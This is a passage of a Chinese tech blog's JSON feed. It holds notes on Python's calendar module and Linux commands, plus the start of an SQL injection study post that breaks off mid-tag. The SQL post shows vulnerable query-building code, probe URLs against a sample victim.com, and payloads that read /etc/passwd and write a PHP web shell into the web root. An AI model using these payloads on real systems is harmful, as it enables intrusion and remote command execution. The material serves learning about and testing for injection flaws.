align=\"left\"><strong>calendar.monthcalendar(year,month)</strong> 返回一个整数的单层嵌套列表。每个子列表装载代表一个星期的整数。Year年month月外的日期都设为0;范围内的日子都由该月第几日表示，从1开始。</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\"><strong>calendar.monthrange(year,month)</strong> 返回两个整数。第一个是该月的星期几的日期码，第二个是该月的日期码。日从0（星期一）到6（星期日）;月从1到12。</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\"><strong>calendar.prcal(year,w=2,l=1,c=6)</strong> 相当于 **print calendar.calendar(year,w=2,l=1,c=6)**。</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\"><strong>calendar.prmonth(year,month,w=2,l=1)</strong> 相当于 <strong>print calendar.month(year,month,w=2,l=1)</strong> 。</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\"><strong>calendar.setfirstweekday(weekday)</strong> 设置每周的起始日期码。0（星期一）到6（星期日）。</td>\n</tr>\n<tr>\n<td align=\"left\">11</td>\n<td align=\"left\"><strong>calendar.timegm(tupletime)</strong> 和time.gmtime相反：接受一个时间元组形式，返回该时刻的时间戳（1970纪元后经过的浮点秒数）。</td>\n</tr>\n<tr>\n<td align=\"left\">12</td>\n<td align=\"left\"><strong>calendar.weekday(year,month,day)</strong> 返回给定日期的日期码。0（星期一）到6（星期日）。月份为 1（一月） 到 12（12月）。</td>\n</tr>\n</tbody></table>\n<p>待更新</p>\n",
            "tags": [
                "学习",
                "python"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/09/08/linux-ming-ling/",
            "url": "https://0xdadream.github.io/2021/09/08/linux-ming-ling/",
            "title": "linux命令",
            "date_published": "2021-09-07T18:11:00.000Z",
            "content_html": "<h1 id=\"linux命令\"><a href=\"#linux命令\" class=\"headerlink\" title=\"linux命令\"></a>linux命令</h1><h2 id=\"netstat-查看Linux中网络系统状态信息\"><a href=\"#netstat-查看Linux中网络系统状态信息\" class=\"headerlink\" title=\"netstat-查看Linux中网络系统状态信息\"></a>netstat-查看Linux中网络系统状态信息</h2><p>选项</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">-a或--all：显示所有连线中的Socket；\n-A<span class=\"token operator\">&lt;</span>网络类型<span class=\"token operator\">&gt;</span>或--<span class=\"token operator\">&lt;</span>网络类型<span class=\"token operator\">&gt;</span>：列出该网络类型连线中的相关地址；\n-c或--continuous：持续列出网络状态；\n-C或--cache：显示路由器配置的快取信息；\n-e或--extend：显示网络其他相关信息；\n-F或--fib：显示FIB；\n-g或--groups：显示多重广播功能群组组员名单；\n-h或--help：在线帮助；\n-i或--interfaces：显示网络界面信息表单；\n-l或--listening：显示监控中的服务器的Socket；\n-M或--masquerade：显示伪装的网络连线；\n-n或--numeric：直接使用ip地址，而不通过域名服务器；\n-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；\n-o或--timers：显示计时器；\n-p或--programs：显示正在使用Socket的程序识别码和程序名称；\n-r或--route：显示Routing Table；\n-s或--statistice：显示网络工作信息统计表；\n-t或--tcp：显示TCP传输协议的连线状况；\n-u或--udp：显示UDP传输协议的连线状况；\n-v或--verbose：显示指令执行过程；\n-V或--version：显示版本信息；\n-w或--raw：显示RAW传输协议的连线状况；\n-x或--unix：此参数的效果和指定<span class=\"token string\">\"-A unix\"</span>参数相同；\n--ip或--inet：此参数的效果和指定<span class=\"token string\">\"-A inet\"</span>参数相同。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"chmod\"><a href=\"#chmod\" class=\"headerlink\" title=\"chmod\"></a>chmod</h2><p><code>chmod</code> 命令在 Unix 和类 Unix 操作系统中用于更改文件和目录的权限。</p>\n<h3 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h3><p><code>chmod</code> 命令的一般语法是：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">chmod</span> <span class=\"token punctuation\">[</span>选项<span class=\"token punctuation\">]</span> 模式 文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li><strong>模式</strong>：指定要设置的权限。</li>\n<li><strong>文件</strong>：指定要更改权限的文件或目录。</li>\n</ul>\n<h3 id=\"权限表示\"><a href=\"#权限表示\" class=\"headerlink\" title=\"权限表示\"></a>权限表示</h3><p>权限可以用符号或数字来表示。</p>\n<h3 id=\"符号表示\"><a href=\"#符号表示\" class=\"headerlink\" title=\"符号表示\"></a>符号表示</h3><p>权限由三组三个字符表示：</p>\n<ul>\n<li>第一组字符是文件所有者（用户）的权限。</li>\n<li>第二组字符是文件所有者所属组的权限。</li>\n<li>第三组字符是其他用户的权限。</li>\n</ul>\n<p>每组可以有以下字符：</p>\n<ul>\n<li><code>r</code>（读）</li>\n<li><code>w</code>（写）</li>\n<li><code>x</code>（执行）</li>\n</ul>\n<p>例如：</p>\n<ul>\n<li><code>rwxr-xr--</code> 表示文件所有者有读、写、执行权限；组有读、执行权限；其他用户只有读权限。</li>\n</ul>\n<h3 id=\"数字表示\"><a href=\"#数字表示\" class=\"headerlink\" title=\"数字表示\"></a>数字表示</h3><p>权限也可以用八进制（base-8）数字表示：</p>\n<ul>\n<li>读由 <code>4</code> 表示。</li>\n<li>写由 <code>2</code> 表示。</li>\n<li>执行由 <code>1</code> 表示。</li>\n</ul>\n<p>权限的总和表示最终权限：</p>\n<ul>\n<li><code>7</code>（读 + 写 + 执行）</li>\n<li><code>6</code>（读 + 写）</li>\n<li><code>5</code>（读 + 执行）</li>\n<li><code>4</code>（只有读）</li>\n<li><code>0</code>（没有权限）</li>\n</ul>\n<p>例如：</p>\n<ul>\n<li><code>755</code> 表示文件所有者有 <code>7</code>（读、写、执行），组有 <code>5</code>（读、执行），其他用户有 <code>5</code>（读、执行）。</li>\n</ul>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><ol>\n<li><p><strong>符号表示更改权限：</strong></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">chmod</span> u+x file.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>给 <code>file.txt</code> 的所有者添加执行权限。</p>\n</li>\n<li><p><strong>数字表示更改权限：</strong></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">chmod</span> <span class=\"token number\">644</span> file.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>设置 <code>file.txt</code> 的所有者有读和写权限，组和其他用户只有读权限。</p>\n</li>\n<li><p><strong>递归更改权限：</strong></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">chmod</span> <span class=\"token parameter variable\">-R</span> <span class=\"token number\">755</span> /path/to/directory<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>设置 <code>/path/to/directory</code> 内所有文件和目录的权限。</p>\n</li>\n</ol>\n<h3 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"选项\"></a>选项</h3><ul>\n<li><code>-R</code>：递归更改文件和目录的权限。</li>\n<li><code>-v</code>：详细模式。对每个处理的文件输出诊断信息。</li>\n<li><code>-c</code>：类似详细模式，但仅在更改时报告。</li>\n</ul>\n<h2 id=\"curl\"><a href=\"#curl\" class=\"headerlink\" title=\"curl\"></a>curl</h2><p><code>curl</code> 是一个非常强大的命令行工具，用于从命令行传输数据。它支持多种协议，如 HTTP, HTTPS, FTP, 和 SMTP。你可以用它来发送 GET 请求、POST 请求、下载文件，甚至与 API 交互。以下是 <code>curl</code> 的一些基本用法示例。</p>\n<h3 id=\"1-基本用法\"><a href=\"#1-基本用法\" class=\"headerlink\" title=\"1. 基本用法\"></a>1. 基本用法</h3><p>最简单的 <code>curl</code> 用法就是发送一个 GET 请求并输出响应内容：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> http://example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这会在终端中显示 <code>http://example.com</code> 的网页内容。</p>\n<h3 id=\"2-保存响应到文件\"><a href=\"#2-保存响应到文件\" class=\"headerlink\" title=\"2. 保存响应到文件\"></a>2. 保存响应到文件</h3><p>使用 <code>-o</code> 选项可以将响应保存到文件中：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-o</span> example.html http://example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这会将 <code>example.com</code> 的内容保存到 <code>example.html</code> 文件中。</p>\n<h3 id=\"3-发送-POST-请求\"><a href=\"#3-发送-POST-请求\" class=\"headerlink\" title=\"3. 发送 POST 请求\"></a>3. 发送 POST 请求</h3><p>你可以使用 <code>-d</code> 选项发送 POST 请求。以下是一个发送表单数据的例子：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-d</span> <span class=\"token string\">\"name=John&amp;age=30\"</span> <span class=\"token parameter variable\">-X</span> POST http://example.com/post<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>-X</code> 选项用于指定请求方法。在这里，我们明确指定为 POST 请求。</p>\n<h3 id=\"4-使用自定义请求头\"><a href=\"#4-使用自定义请求头\" class=\"headerlink\" title=\"4. 使用自定义请求头\"></a>4. 使用自定义请求头</h3><p>你可以使用 <code>-H</code> 选项添加自定义请求头：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"Authorization: Bearer your_token_here\"</span> http://example.com/secure<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这在访问需要认证的 API 时非常有用。</p>\n<h3 id=\"5-下载文件\"><a href=\"#5-下载文件\" class=\"headerlink\" title=\"5. 下载文件\"></a>5. 下载文件</h3><p>使用 <code>-O</code> 选项可以直接下载文件，并保留文件的原始名称：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-O</span> http://example.com/file.zip<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这会将 <code>file.zip</code> 下载到当前目录。</p>\n<h3 id=\"6-处理重定向\"><a href=\"#6-处理重定向\" class=\"headerlink\" title=\"6. 处理重定向\"></a>6. 处理重定向</h3><p>默认情况下，<code>curl</code> 不会跟随重定向。你可以使用 <code>-L</code> 选项让它跟随重定向：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-L</span> http://short.url<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这会跟随重定向到最终的 URL 并获取内容。</p>\n<h3 id=\"7-显示详细信息\"><a href=\"#7-显示详细信息\" class=\"headerlink\" title=\"7. 显示详细信息\"></a>7. 显示详细信息</h3><p>如果你想查看请求和响应的详细信息，可以使用 <code>-v</code> 选项：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-v</span> http://example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这会显示所有请求头、响应头以及其它调试信息。</p>\n<h3 id=\"8-使用代理\"><a href=\"#8-使用代理\" class=\"headerlink\" title=\"8. 使用代理\"></a>8. 使用代理</h3><p>如果你需要通过代理访问网络资源，可以使用 <code>-x</code> 选项：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-x</span> http://proxy.example.com:8080 http://example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"9-上传文件\"><a href=\"#9-上传文件\" class=\"headerlink\" title=\"9. 上传文件\"></a>9. 上传文件</h3><p>你可以使用 <code>-F</code> 选项上传文件：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-F</span> <span class=\"token string\">\"file=@/path/to/file\"</span> http://example.com/upload<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这会将指定的文件上传到服务器。</p>\n<h3 id=\"10-指定请求方法\"><a href=\"#10-指定请求方法\" class=\"headerlink\" title=\"10. 指定请求方法\"></a>10. 指定请求方法</h3><p>尽管 <code>curl</code> 默认发送的是 GET 请求，你也可以使用 <code>-X</code> 选项指定其他方法，如 PUT, DELETE 等：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-X</span> DELETE http://example.com/resource/123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"进阶用法\"><a href=\"#进阶用法\" class=\"headerlink\" title=\"进阶用法\"></a>进阶用法</h3><p><code>curl</code> 还支持更多复杂的用法，如通过 <code>--data-binary</code> 发送原始二进制数据、使用 <code>--header</code> 添加多个请求头、通过 <code>-u</code> 进行 HTTP 基本认证等。</p>\n<p>如果你想查看 <code>curl</code> 的所有功能和选项，可以通过以下命令查看手册：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">man</span> <span class=\"token function\">curl</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>或者查看帮助文档：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">--help</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n",
            "tags": [
                "linux",
                "学习"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/07/19/sql/",
            "url": "https://0xdadream.github.io/2021/07/19/sql/",
            "title": "SQL注入学习",
            "date_published": "2021-07-19T01:25:00.000Z",
            "content_html": "<h1 id=\"SQL注入学习\"><a href=\"#SQL注入学习\" class=\"headerlink\" title=\"SQL注入学习\"></a>SQL注入学习</h1><h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><h3 id=\"数据库与web交互\"><a href=\"#数据库与web交互\" class=\"headerlink\" title=\"数据库与web交互\"></a>数据库与web交互</h3><p>数据库驱动的Web应用通常包含三层：表示层、逻辑层和存储层</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/bd917bb464f4ecc0a70931647924489c.png\"></p>\n<p>Web浏览器（表示层）向中间层（逻辑层）发送请求，后者依次调用由位于应用层 的应用服务器提供的API，应用层通过查询、更新数据库（存储层）来响应该请求。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/fb4fe488ca6064bb837f649984e43f12.png\"></p>\n<h3 id=\"SQL注入的产生过程\"><a href=\"#SQL注入的产生过程\" class=\"headerlink\" title=\"SQL注入的产生过程\"></a><strong>SQL</strong>注入的产生过程</h3><h4 id=\"构造动态字符串\"><a href=\"#构造动态字符串\" class=\"headerlink\" title=\"构造动态字符串\"></a>构造动态字符串</h4><p>简单来说就是将得到参数拼接到查询语句，然后执行，下列不当将会导致SQL注入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">WHERE</span> FIELD <span class=\"token operator\">=</span> <span class=\"token string\">'input'</span>\n\ninput 在不同语言运行的服务器上写法不同\nPHP\n$query <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM table WHERE field ='$_GET[\"</span>input<span class=\"token string\">\"]'\"</span>\n<span class=\"token punctuation\">.</span>NET\nquery <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM table WHERE field = ' \"</span> <span class=\"token operator\">+</span> request<span class=\"token punctuation\">.</span>getParameter<span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\" ' \"</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><p>转义字符处理不当</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">$<span class=\"token keyword\">SQL</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM table WHERE field = '$_GET[\"</span>input<span class=\"token string\">\"]'\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>SQL数据库将单引号字符<code>'</code>解析成代码与数据间的分界线，单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">table</span> <span class=\"token keyword\">WHERE</span> field <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n报错\nYou have an error <span class=\"token operator\">in</span> your <span class=\"token keyword\">SQL</span> syntax<span class=\"token punctuation\">;</span> <span class=\"token keyword\">check</span> the manual that corresponds <span class=\"token keyword\">to</span> your MySQL server version <span class=\"token keyword\">for</span> the <span class=\"token keyword\">right</span> syntax <span class=\"token keyword\">to</span> <span class=\"token keyword\">use</span> near <span class=\"token string\">''''</span> <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span>' at line <span class=\"token number\">1</span>\n这是一种报错<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>出现该错误是因为单引号字符被解析成了字符串分隔符。运行时执行的SQL查询在语法上存在错误(它包含多个字符串分隔符)，所以数据库抛出异常。SQL数据库将单引号字符看作特殊字符(字符串分隔符)。</p>\n<p>当然还有其他的转义字符，比如oracle中，空格<code> </code> 双斜线<code>|| </code>逗号<code>,</code> 点号<code>.</code> <code>*/</code>以及双引号<code>\"</code> 这里不详细讲解。</p>\n<p><code>||</code>将前后的执行结果连接</p>\n<p><code>*/</code> 结束注释</p>\n</li>\n<li><p>类型处理不当</p>\n<p>接受的参数类型不一定是字符串，也可能是数字型，这里一味地过滤单引号也就没多大用处。</p>\n<p>数字型<code>or 1=1</code>大概判断，一旦存在并有FILE权限，就能使用下面代码注入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">SELECT</span> LOAD_FILE<span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token string\">\"&lt;? system($_REQUEST['cmd']); ?&gt;\"</span><span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">\"/var/www/html/victim.com/cmd.php\"</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li><p>查询语句组装不当</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$SQL</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"columnl\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\",\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"column2\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\",\"</span><span class=\"token operator\">.</span>\n<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"column3\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"FROM\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"table\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这种随便改个包发送，数据库基本上就没了，因为所有参数可改</p>\n</li>\n<li><p>错误处理不当</p>\n<p>就如第一个报错，报错信息完全不必展示给用户看，不展示，自然会阻断部分攻击者。</p>\n</li>\n<li><p>多个提交处理不当</p>\n<p>这里有点条件竞争的意思</p>\n<p>第一个提交需要验证码，第二个却没设置，正常用户可能会从第一个提交进入，攻击者就会用第二个提交FUZZ，这就和某些应用分享一样，不验证是否成功，虚晃一招。</p>\n</li>\n</ul>\n<h4 id=\"不安全的数据库配置\"><a href=\"#不安全的数据库配置\" class=\"headerlink\" title=\"不安全的数据库配置\"></a>不安全的数据库配置</h4><p>默认的数据库系统管理员账号，预置的系统库，表，很多的默认配置都是不安全的，试想一下，知道你的管理员账号，爆破密码会降低多少数量级的难度</p>\n<p>降低权限是一个好习惯</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">--Oracle语句，列举当前用户可访问的所有表</span>\n<span class=\"token keyword\">SELECT</span> OWNER<span class=\"token punctuation\">,</span> TABLE_NAME <span class=\"token keyword\">FROM</span> ALL_TABLES <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> TABLE_NAME<span class=\"token punctuation\">;</span> \n<span class=\"token comment\">--MySQL语句，列举当前用户可访问的所有表和数据库</span>\n<span class=\"token keyword\">SELECT</span> table_schema<span class=\"token punctuation\">,</span> table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">--MSSQL语句，使用系统表列举所有可访问的表</span>\n<span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> sysobjects <span class=\"token keyword\">WHERE</span> xtype <span class=\"token operator\">=</span> <span class=\"token string\">'U'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">--MSSQL语句，使用目录视图列举所有可访问的表</span>\n<span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"SQL注入测试\"><a href=\"#SQL注入测试\" class=\"headerlink\" title=\"SQL注入测试\"></a>SQL注入测试</h2><h3 id=\"寻找注入点\"><a href=\"#寻找注入点\" class=\"headerlink\" title=\"寻找注入点\"></a>寻找注入点</h3><h4 id=\"借助推理进行测试\"><a href=\"#借助推理进行测试\" class=\"headerlink\" title=\"借助推理进行测试\"></a>借助推理进行测试</h4><h5 id=\"识别数据输入\"><a href=\"#识别数据输入\" class=\"headerlink\" title=\"识别数据输入\"></a>识别数据输入</h5><p>GET请求、POST请求、HTTP其他与数据库有交互的都可能存在注入，比如COOKIE注入。</p>\n<h5 id=\"操纵参数\"><a href=\"#操纵参数\" class=\"headerlink\" title=\"操纵参数\"></a>操纵参数</h5><p><code>http://sql.com/index.php?id=1</code></p>\n<p>这个<code>1</code>就是参数，这个参数是可以控制的，可以用来测试，比如<code>'</code></p>\n<p>先将<code>id</code>改为一个不常见的参数，报错</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Warning: mysql_fetch_assoc <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> : supplied argument <span class=\"token operator\">is</span> <span class=\"token operator\">not</span> a valid MySQL result resource <span class=\"token operator\">in</span> XXXX <span class=\"token keyword\">on</span> line <span class=\"token number\">34</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>加一个单引号<code>http://sql.com/index.php?id=1'</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">You have an error <span class=\"token operator\">in</span> your <span class=\"token keyword\">SQL</span> syntax<span class=\"token punctuation\">;</span> <span class=\"token keyword\">check</span> the manual that corresponds <span class=\"token keyword\">to</span> your MySQL server version <span class=\"token keyword\">for</span> the <span class=\"token keyword\">right</span> syntax <span class=\"token keyword\">to</span> <span class=\"token keyword\">use</span> near <span class=\"token string\">''''</span> at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>还有一些其他的测试方法</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">在Oracle和PostgreSQL中的漏洞。向Web服务器发送下面两个请求：\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.php?category=bikes</span>\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.php?category=bi'||'kes</span>\n在Microsoft <span class=\"token keyword\">SQL</span> Server中与之等价的请求为：\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.php?category=bikes</span>\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.php?category=bi'+'kes</span>\n在MySQL中与之等价的请求为（请注意两个单引号之间的空格）：\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.php?category=bikes</span>\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.php?category=bi''kes</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"信息工作流\"><a href=\"#信息工作流\" class=\"headerlink\" title=\"信息工作流\"></a>信息工作流</h5><p><img src=\"https://images.dadream.eu.org/images/2024/07/264b07c0f1804dc008b15f081b391718.png\"></p>\n<h4 id=\"数据库错误\"><a href=\"#数据库错误\" class=\"headerlink\" title=\"数据库错误\"></a>数据库错误</h4><p>就是上文提到的报错</p>\n<h5 id=\"常见的sql漏洞\"><a href=\"#常见的sql漏洞\" class=\"headerlink\" title=\"常见的sql漏洞\"></a>常见的sql漏洞</h5><h6 id=\"Sql-Server错误\"><a href=\"#Sql-Server错误\" class=\"headerlink\" title=\"Sql Server错误\"></a>Sql Server错误</h6><p>假设在victim.com应用中找到了一个名为showproducts.php的页面，页面脚本接收名为id 的参数并根据id参数的值显示单个商品：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/showproduct.aspx?id=2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果将id参数的值修改成下列内容：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/showproduct.aspx?id=attacker</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>应用会返回类似于下列内容的错误：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Server Error <span class=\"token operator\">in</span> <span class=\"token string\">'/'' Application.\nInvalid column name '</span>attacker<span class=\"token string\">'.\nDescription: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Invalid column name '</span>attacker'<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>在这个错误的基础上，可以猜想第一个示例中应用创建的SQL语句应如下：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> products <span class=\"token keyword\">WHERE</span> idproduct<span class=\"token operator\">=</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>上述语句返回的结果集是idproduct字段等于2时的商品。如果注入一个非数字值，比如 attacker,那么最终发送给数据库服务器的SQL语句将如下所示：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> products <span class=\"token keyword\">WHERE</span> idproduct<span class=\"token operator\">=</span>attacker<span aria-hidden=\"true\" 